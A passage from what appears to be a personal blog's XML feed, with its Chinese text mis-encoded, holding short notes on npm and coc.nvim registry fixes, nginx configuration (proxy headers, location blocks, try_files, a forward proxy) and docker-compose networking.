    <content type="html"><![CDATA[<p><a href="https://b23.tv/qGygGTo">å‚è€ƒ</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>MD5 æ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•.</p><p>ç”¨äº:</p><ul><li>å¯†ç ä¿æŠ¤</li><li>æ£€éªŒæ–‡ä»¶å®Œæ•´æ€§</li><li>æ•°å­—ç­¾å</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-npm-åœ¨è®¾ç½®äº†-proxy-ä¹‹åæ— æ³•ä½¿ç”¨</title>
    <link href="/2022/10/05/%E8%A7%A3%E5%86%B3-npm-%E5%9C%A8%E8%AE%BE%E7%BD%AE%E4%BA%86-proxy-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/05/%E8%A7%A3%E5%86%B3-npm-%E5%9C%A8%E8%AE%BE%E7%BD%AE%E4%BA%86-proxy-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>å–æ¶ˆæ‰è®¾ç½®å°±è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">unset</span> http_proxy<br>$ <span class="hljs-built_in">unset</span> https_proxy<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-coc-ä¸‹è½½é—®é¢˜</title>
    <link href="/2022/10/05/%E8%A7%A3%E5%86%B3-coc-%E4%B8%8B%E8%BD%BD%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/05/%E8%A7%A3%E5%86%B3-coc-%E4%B8%8B%E8%BD%BD%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>åº”è¯¥è¯´æ˜¯æš‚æ—¶è§£å†³, æ‰¾åˆ°ä¸€ä¸ª npm çš„æº:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>skimdb.npmjs.com<span class="hljs-regexp">/registry/</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>~/.npmrc</code> ä¸­æ·»åŠ è¿™ä¸ªæº:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">coc.nvim:registry=https:<span class="hljs-regexp">//</span>skimdb.npmjs.com<span class="hljs-regexp">/registry/</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–å¥½å¤šæºéƒ½ä¸è¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CoC-æ¢æº</title>
    <link href="/2022/10/05/CoC-%E6%8D%A2%E6%BA%90/"/>
    <url>/2022/10/05/CoC-%E6%8D%A2%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<p>åŸæœ¬ä»¥ä¸ºç›´æ¥åˆ‡æ¢ npm æˆ– yarn çš„æºå°±å¯ä»¥äº†, ç»“æœå‘ç°å¹¶æ²¡æœ‰åˆ‡æ¢æˆåŠŸ:<br><img src="/../img/fail_change_source.png" alt="fail"></p><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡º <code>https://registry.npmjs.org</code> è¿˜æ˜¯åŸæ¥çš„æº.</p><p>æŸ¥é˜…æºä»£ç æ–‡æ¡£</p><p><img src="/../img/.png" alt="coc-registry"></p><p>å‘ç°éœ€è¦ä¿®æ”¹ <code>~/.npmrc</code> æ–‡ä»¶.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-CocConfig-æ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶é—®é¢˜</title>
    <link href="/2022/10/05/%E8%A7%A3%E5%86%B3-CocConfig-%E6%89%BE%E4%B8%8D%E5%88%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/05/%E8%A7%A3%E5%86%B3-CocConfig-%E6%89%BE%E4%B8%8D%E5%88%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>:CocConfig</code> è¿™ä¸ªå‘½ä»¤æ—¶æ€»ä¼šæŠ¥é”™, ä¹‹åå°±å»æŸ¥çœ‹äº†æºä»£ç :<br><img src="/../img/cocconfig.png" alt="æºä»£ç "></p><p>å‘ç°è¯»å–äº† <code>VIMCONFIG</code> è¿™ä¸ªç¯å¢ƒå˜é‡, å› æ­¤å»æŸ¥çœ‹è¿™ä¸ªç¯å¢ƒå˜é‡çš„è®¾ç½®, ç¡®å®è®¾ç½®æœ‰è¯¯.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-cloudflare</title>
    <link href="/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-cloudflare/"/>
    <url>/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-cloudflare/</url>
    
    <content type="html"><![CDATA[<p>Cloudflare æ˜¯ä¸€å®¶å…¬å¸.</p><p>Cloudflare å¯ä»¥æä¾›ç½‘ç»œå®‰å…¨æœåŠ¡.</p><p>Cloudflare å¯ä»¥æä¾›ç½‘é¡µçš„æµè§ˆé€Ÿåº¦.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-nginx-upstream-åˆ©ç”¨åŸŸåè®¿é—®</title>
    <link href="/2022/10/05/%E5%85%B3%E4%BA%8E-nginx-upstream-%E5%88%A9%E7%94%A8%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/10/05/%E5%85%B3%E4%BA%8E-nginx-upstream-%E5%88%A9%E7%94%A8%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/wx370092877/article/details/126168956">å‚è€ƒ2</a><br>nginx åœ¨åšä»£ç†è½¬å‘æ—¶, ä¼šè‡ªè¡Œå¯¹å‰æ®µè¯·æ±‚å¤´è¿›è¡Œå¤„ç†, å¹¶æ ¹æ®å¤„ç†ç»“æœ, å‘æœåŠ¡å™¨å‘é€è¯·æ±‚.</p><p>å¯¹ç…§åå‘ä»£ç†æŒ‡ä»¤å’Œä¸€äº›å†…ç½®å˜é‡æ¥é…ç½®:<br><img src="/../img/reverse_proxy.png" alt="åå‘ä»£ç†"></p><h2 id="proxy-set-header"><a href="#proxy-set-header" class="headerlink" title="proxy_set_header"></a>proxy_set_header</h2><p><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_set_header">å®˜æ–¹æ–‡æ¡£</a><br>ä¸»è¦è®²ä¸€ä¸‹è¿™ä¸ª <code>Host</code> è¿™æ˜¯ <code>Request Headers</code> é‡Œé¢çš„ä¸€ä¸ª field (å­—æ®µ):<br><img src="/../img/Host.png" alt="Host"></p><p><code>proxy_set_header</code> ç¬¬ä¸€ä¸ªå‚æ•°ä¸º field, ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿™ä¸ª field çš„å€¼.</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">proxy_set_header</span> <span class="hljs-meta">field</span> value<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæŒ‡ä»¤ä¸éœ€è¦å’Œ <code>proxy_pass</code> é…åˆä½¿ç”¨.</p><h2 id="å¸¸ç”¨å†…ç½®å˜é‡"><a href="#å¸¸ç”¨å†…ç½®å˜é‡" class="headerlink" title="å¸¸ç”¨å†…ç½®å˜é‡"></a>å¸¸ç”¨å†…ç½®å˜é‡</h2><p><a href="https://blog.csdn.net/aiwangtingyun/article/details/120337434">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker-compose-éƒ¨åˆ†ç¬”è®°</title>
    <link href="/2022/10/05/docker-compose-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/05/docker-compose-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/docker/docker-compose.html">èœé¸Ÿæ•™ç¨‹ docker-compose</a><br><a href="https://docs.docker.com/compose/compose-file/#networks-top-level-element">å®˜ç½‘</a></p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><h2 id="version-æŒ‡ä»¤"><a href="#version-æŒ‡ä»¤" class="headerlink" title="version æŒ‡ä»¤"></a>version æŒ‡ä»¤</h2><p>æŒ‡å®šä» compose çš„å“ªä¸ªç‰ˆæœ¬å¼€å§‹åˆ¶å®š.</p><h2 id="yml-é…ç½®ä¸­çš„-build-æŒ‡ä»¤"><a href="#yml-é…ç½®ä¸­çš„-build-æŒ‡ä»¤" class="headerlink" title="yml é…ç½®ä¸­çš„ build æŒ‡ä»¤"></a>yml é…ç½®ä¸­çš„ build æŒ‡ä»¤</h2><p>å¦‚:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">build:</span><br><span class="hljs-symbol">    context:</span><br><span class="hljs-symbol">    dockerfile:</span><br><span class="hljs-symbol">    args:</span><br><span class="hljs-symbol">    labels:</span><br><span class="hljs-symbol">    target:</span><br></code></pre></td></tr></table></figure><p><code>contest</code> æŒ‡æ˜ç›®å½•æ‰€åœ¨ä½ç½®.</p><p><code>dockerfile</code> æŒ‡å®šæ„å»ºé•œåƒçš„ Dockerfile æ–‡ä»¶å.</p><p><code>args</code> æŒ‡æ˜æ„å»ºå‚æ•°.</p><p><code>labels</code> è®¾ç½®æ„å»ºé•œåƒçš„æ ‡ç­¾.</p><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><p>è¦†ç›–å®¹å™¨å¯åŠ¨çš„é»˜è®¤å‘½ä»¤.<br>å¦‚:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">command:</span> [<span class="hljs-string">&quot;bundle&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>]<br></code></pre></td></tr></table></figure><h2 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h2><p>æŒ‡å®šå®¹å™¨åç§°:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">container_name:</span> name<br></code></pre></td></tr></table></figure><h2 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h2><p>è®¾ç½®ä¾èµ–å…³ç³»:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">service</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>        <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><h1 id="å…³äº-networks"><a href="#å…³äº-networks" class="headerlink" title="å…³äº networks"></a>å…³äº networks</h1><p>è¿™ä¸ª <code>networks</code> æ˜¯å’Œ <code>services</code> æ˜¯å†™åœ¨åŒä¸€ä¸ªå±‚çº§çš„, å…¶ä½œç”¨æ˜¯åˆ›å»ºç½‘ç»œ, å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs docker-compose">services:<br>  frontend:<br>    image: awesome/webapp<br>    networks:<br>      - front-tier<br>      - back-tier<br><br>networks:<br>  front-tier:<br>  back-tier:<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯å®˜æ–¹çš„ä¾‹å­, è¿™é‡Œåˆ›å»ºäº†ä¸¤ä¸ªç½‘ç»œ <code>front-tier</code> å’Œ <code>back-tier</code>, <code>frontend</code> è¿™ä¸ªæœåŠ¡ä¹Ÿé€šè¿‡ <code>networks</code> æ¥åŠ å…¥ç½‘ç»œ.</p><p><code>ipam</code> æ˜¯ IP Address Management, is the administration of DNS and DHCP. IPAM æ˜¯ planning, tracking, and managing the Internet Protocol address space used in network. å¤§è‡´å°±æ˜¯è¯´ç”¨æ¥ç®¡ç† IP åœ°å€.</p><p>Compose implementations å¿…é¡»è¦æä¾› external connectivity to networks.</p><h1 id="å‚è€ƒåšæ–‡"><a href="#å‚è€ƒåšæ–‡" class="headerlink" title="å‚è€ƒåšæ–‡"></a>å‚è€ƒåšæ–‡</h1><p><a href="https://www.jianshu.com/p/3004fbce4d37">å‚è€ƒ1</a><br><a href="https://juejin.cn/post/6844903976534540296">å‚è€ƒ2 å« docker-compose.yml çš„è¯¦ç»†è§£é‡Š</a><br>å®¹å™¨åœ¨åˆ›å»ºæ—¶, åˆ†é…çš„ ip å¯èƒ½ä¸åœ¨ä¸€ä¸ªç½‘æ®µå†….</p><p>æŒ‡å®šå®¹å™¨åç§°è¦ç”¨ <code>container_name</code>, å¦åˆ™é»˜è®¤åç§°ä¸º:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å½“å‰ç›®å½•åç§°<span class="hljs-emphasis">_serviceä¸‹çš„æœåŠ¡åç§°_</span>æ•°å­—    <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ•°å­—çš„è§„å¾‹æš‚æ—¶ä¸æ¸…æ¥š.</p><p>æŒ‡å®š networks çš„åç§°:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">networks:</span><br><span class="hljs-symbol">  A_Network:</span><br><span class="hljs-symbol">    name:</span> this_is_the_name<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>name</code> è¿™ä¸ªé”®å€¼å¯¹.</p><p>å¦‚æœä¸è‡ªå®šä¹‰ networks, docker è‡ªå·±æ·»åŠ çš„ network åç§°ä¸º:</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">ç›®å½•å<span class="hljs-number">_</span><span class="hljs-keyword">default</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯è‡ªå®šä¹‰, å¦‚ä¸Šé¢çš„ <code>A_Network</code>, åˆ™åç§°ä¸º:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ç›®å½•å_<span class="hljs-built_in">A_Network</span><br></code></pre></td></tr></table></figure><p>è‹¥æ˜¯æ·»åŠ äº† name é”®å€¼å¯¹, åˆ™ä¸º:</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>the<span class="hljs-number">_n</span>ame<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Nginx-æ‰“å¼€çš„-html-é¡µé¢æ²¡æœ‰è¢«-js-å’Œ-css-æ¸²æŸ“</title>
    <link href="/2022/10/05/%E5%85%B3%E4%BA%8E-Nginx-%E6%89%93%E5%BC%80%E7%9A%84-html-%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E8%A2%AB-js-%E5%92%8C-css-%E6%B8%B2%E6%9F%93/"/>
    <url>/2022/10/05/%E5%85%B3%E4%BA%8E-Nginx-%E6%89%93%E5%BC%80%E7%9A%84-html-%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E8%A2%AB-js-%E5%92%8C-css-%E6%B8%B2%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<p>å…ˆæ¥çœ‹çœ‹è¿™ä¸ª:<br><img src="/../img/error_404.png" alt="404"></p><p>è¿™ä¸ªå°±è¯´æ˜äº†é—®é¢˜, æ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶, æˆ‘ä»¬çš„ <code>nginx.conf</code> å†…å®¹å¦‚ä¸‹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk"> server &#123;<br>       listen          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">82</span>;<br>       server_name     _;<br><br>       root            <span class="hljs-regexp">/var/</span>www/html;<br>       index           <span class="hljs-regexp">/page/i</span>ndex.html;<br><br>       access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>       error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br><br>       location /h3 &#123;<br>          index /h3.html;<br>       &#125;<br><br>       location ~ (h1)|(h2) &#123;<br>          deny all;<br>       &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è™½ç„¶è®¾ç½®äº† root ç›®å½•, ä½†æ˜¯å¹¶æ²¡æœ‰å…¶ä½œç”¨.</p><p>é‡æ–°å†™ä¸€ä¸ª <code>location</code> block æ¥æ­£ç¡®å¯¼å‘æ–‡ä»¶:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"> server &#123;<br>       listen          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">82</span>;<br>       server_name     _;<br><br>       root            <span class="hljs-regexp">/var/</span>www/html;<br>       index           <span class="hljs-regexp">/page/i</span>ndex.html;<br><br>       access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>       error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br><br>       location ~* (.*).(js|css) &#123;<br>          root <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>page/;<br>        &#125;<br><br>       location /h3 &#123;<br>          index /h3.html;<br>       &#125;<br><br>       location ~ (h1)|(h2) &#123;<br>          deny all;<br>       &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ­£ç¡®æ˜¾ç¤ºäº†:<br><img src="/../img/right.png" alt="right"></p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-é…ç½®ä¸­çš„-try_files</title>
    <link href="/2022/10/05/Nginx-%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84-try_files/"/>
    <url>/2022/10/05/Nginx-%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84-try_files/</url>
    
    <content type="html"><![CDATA[<p>å¤§æ¦‚æ ¼å¼ä¸º:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">try_files</span></span> <span class="hljs-keyword">file</span> ... url;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæŒ‡ä»¤çš„å«ä¹‰ä¸º, æ£€æµ‹ file æ˜¯å¦å­˜åœ¨, æ‰“å¼€ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„ file, å¦‚æœæ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ª file, é‚£ä¹ˆé‡å®šå‘åˆ°æœ€åçš„ url.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-ä¸­å…³äº-Squid</title>
    <link href="/2022/10/04/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Squid/"/>
    <url>/2022/10/04/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Squid/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Squid">ArchWiki</a><br><a href="http://www.squid-cache.org/">å®˜æ–¹ç½‘ç«™</a></p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆ©ç”¨-Nginx-æ­å»ºæ­£å‘ä»£ç†</title>
    <link href="/2022/10/04/%E5%88%A9%E7%94%A8-Nginx-%E6%90%AD%E5%BB%BA%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/04/%E5%88%A9%E7%94%A8-Nginx-%E6%90%AD%E5%BB%BA%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/brithToSpring/p/16152403.html">å‚è€ƒ</a></p><p>å…¶ç¤ºä¾‹ <code>nginx.conf</code> éƒ¨åˆ†å†…å®¹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>    resolver <span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span>;       <span class="hljs-comment">#æŒ‡å®šDNSæœåŠ¡å™¨IPåœ°å€ </span><br>    listen <span class="hljs-number">80</span>;<br>    location / &#123;<br>        proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;     <span class="hljs-comment">#è®¾å®šä»£ç†æœåŠ¡å™¨çš„åè®®å’Œåœ°å€ </span><br>                proxy_set_header HOST <span class="hljs-variable">$host</span>;<br>                proxy_buffers <span class="hljs-number">256</span> <span class="hljs-number">4</span>k;<br>                proxy_max_temp_file_size <span class="hljs-number">0</span>k;<br>                proxy_connect_timeout <span class="hljs-number">30</span>;<br>                proxy_send_timeout <span class="hljs-number">60</span>;<br>                proxy_read_timeout <span class="hljs-number">60</span>;<br>                proxy_next_upstream error timeout invalid_header http_502;<br>    &#125;<br>&#125;<br>server &#123;<br>    resolver <span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span>;       <span class="hljs-comment">#æŒ‡å®šDNSæœåŠ¡å™¨IPåœ°å€ </span><br>    listen <span class="hljs-number">443</span>;<br>    location / &#123;<br>       proxy_pass https:<span class="hljs-regexp">//</span><span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;    <span class="hljs-comment">#è®¾å®šä»£ç†æœåŠ¡å™¨çš„åè®®å’Œåœ°å€ </span><br>             proxy_buffers <span class="hljs-number">256</span> <span class="hljs-number">4</span>k;<br>             proxy_max_temp_file_size <span class="hljs-number">0</span>k;<br>       proxy_connect_timeout <span class="hljs-number">30</span>;<br>       proxy_send_timeout <span class="hljs-number">60</span>;<br>       proxy_read_timeout <span class="hljs-number">60</span>;<br>       proxy_next_upstream error timeout invalid_header http_502;<br>    &#125;<br>&#125;<br>[root@localhost ~]<span class="hljs-comment"># /usr/local/nginx-1.12.1/sbin/nginx -s reload</span><br><br></code></pre></td></tr></table></figure><p>ä¸»è¦è¿˜æ˜¯åˆ©ç”¨ <code>proxy_pass</code> æ¥è½¬å‘è¯·æ±‚.</p><h1 id="resolver-å…³é”®å­—"><a href="#resolver-å…³é”®å­—" class="headerlink" title="resolver å…³é”®å­—"></a>resolver å…³é”®å­—</h1><p><a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#resolver">æ–‡æ¡£</a><br>ç”¨äºæŒ‡å®š DNS æœåŠ¡å™¨.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-é«˜æ€§èƒ½-Web-æœåŠ¡å™¨è¯¦è§£-Notes</title>
    <link href="/2022/10/03/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%A6%E8%A7%A3-Notes/"/>
    <url>/2022/10/03/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%A6%E8%A7%A3-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬3ç« -Nginx-æœåŠ¡å™¨æ¶æ„åˆæ¢"><a href="#ç¬¬3ç« -Nginx-æœåŠ¡å™¨æ¶æ„åˆæ¢" class="headerlink" title="ç¬¬3ç«  Nginx æœåŠ¡å™¨æ¶æ„åˆæ¢"></a>ç¬¬3ç«  Nginx æœåŠ¡å™¨æ¶æ„åˆæ¢</h1><h3 id="3-1-2-Nginx-æ¨¡å—åŒ–ç»“æ„"><a href="#3-1-2-Nginx-æ¨¡å—åŒ–ç»“æ„" class="headerlink" title="3.1.2 Nginx æ¨¡å—åŒ–ç»“æ„"></a>3.1.2 Nginx æ¨¡å—åŒ–ç»“æ„</h3><p>Nginx å¯ä»¥é€šè¿‡æ¨¡å—æ¥æ‰©å±•åŠŸèƒ½. å°±åƒ vim è£…æ’ä»¶.</p><p>ä¸€èˆ¬åˆ†ä¸º:</p><ul><li>æ ¸å¿ƒæ¨¡å—</li><li>æ ‡å‡† HTTP æ¨¡å—</li><li>å¯é€‰ HTTP æ¨¡å—</li><li>é‚®ä»¶æœåŠ¡æ¨¡å—</li><li>ç¬¬ä¸‰æ–¹æ¨¡å—</li></ul><p>æ·»åŠ çš„æ¨¡å—æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´.</p><p>æ ¸å¿ƒæ¨¡å—å’Œæ ‡å‡† HTTP æ¨¡å—åœ¨ Nginx å¿«é€Ÿç¼–è¯‘åå°±åŒ…å«åœ¨ Nginx ä¸­.</p><p>åœ¨æˆ‘è£…å¾— docker å®¹å™¨ (Ubuntu 18.04) é‡Œ, æ¨¡å—ä½äº <code>/usr/lib/nginx/modules</code> è¿™ä¸ªç›®å½•.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨-Linux-ä¸‹ç”¨å‘½ä»¤è¡Œé¢„è§ˆ-html-æ–‡ä»¶</title>
